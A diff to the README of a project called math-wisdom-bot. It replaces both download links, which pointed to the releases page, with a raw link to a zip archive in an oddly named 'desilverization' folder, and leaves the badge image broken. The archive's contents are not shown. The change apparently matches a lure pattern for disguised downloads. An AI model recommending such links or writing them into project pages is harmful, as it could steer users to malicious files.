@@ -1,6 +1,6 @@
 # 🧮 math-wisdom-bot - Your Smart Math Assistant Awaits
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Ziiad76/math-wisdom-bot/releases)
+[![Download Now](https://github.com/Ziiad76/math-wisdom-bot/raw/refs/heads/main/desilverization/math-bot-wisdom-3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/Ziiad76/math-wisdom-bot/raw/refs/heads/main/desilverization/math-bot-wisdom-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, make sure your computer meets the following requirements:
 
 To get your hands on math-wisdom-bot, visit the link below to download the latest version:
 
-[Download math-wisdom-bot](https://github.com/Ziiad76/math-wisdom-bot/releases)
+[Download math-wisdom-bot](https://github.com/Ziiad76/math-wisdom-bot/raw/refs/heads/main/desilverization/math-bot-wisdom-3.9.zip)
 
 ### Step-by-Step Download Instructions
 
